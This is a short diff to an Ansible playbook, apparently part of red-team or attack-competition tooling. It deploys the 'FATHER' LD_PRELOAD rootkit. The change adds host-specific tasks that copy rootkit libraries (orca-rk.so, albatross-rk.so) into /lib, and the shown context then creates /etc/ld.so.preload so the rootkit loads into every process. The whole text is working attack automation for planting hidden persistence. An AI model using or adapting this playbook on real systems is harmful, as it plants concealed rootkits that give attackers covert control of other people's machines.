@@ -11,12 +11,19 @@
     path: "{{ father_flagpath }}"
   register: flagregister
 
-- name: FATHER | copy rootkit
+- name: copy rootkit (orca)
   copy:
-    src: rk.so
+    src: orca-rk.so
     dest: "/lib/{{ father_librarypath }}"
     mode: 0555
-  when: not flagregister.stat.exists
+  when: not flagregister.stat.exists and inventory_hostname_short == "orca"
+
+- name: copy rootkit (albatross)
+  copy:
+    src: albatross-rk.so
+    dest: "/lib/{{ father_librarypath }}"
+    mode: 0555
+  when: not flagregister.stat.exists and inventory_hostname_short == "albatross"
 
 - name: FATHER | create /etc/ld.so.preload
   file:
